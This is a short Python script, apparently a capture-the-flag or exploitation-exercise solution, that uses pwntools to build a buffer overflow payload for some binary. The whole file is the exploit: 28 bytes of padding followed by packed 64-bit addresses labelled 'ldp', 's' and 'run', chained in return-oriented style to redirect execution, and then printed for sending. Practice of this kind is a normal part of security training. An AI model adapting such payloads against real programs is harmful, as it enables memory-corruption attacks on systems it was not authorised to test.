from pwn import *

ldp = p64(0x10000051c)
run = p64(0x100000504)
s = p64(0x100008000)


pl=b"A"*28 + ldp + s + run
print(pl)

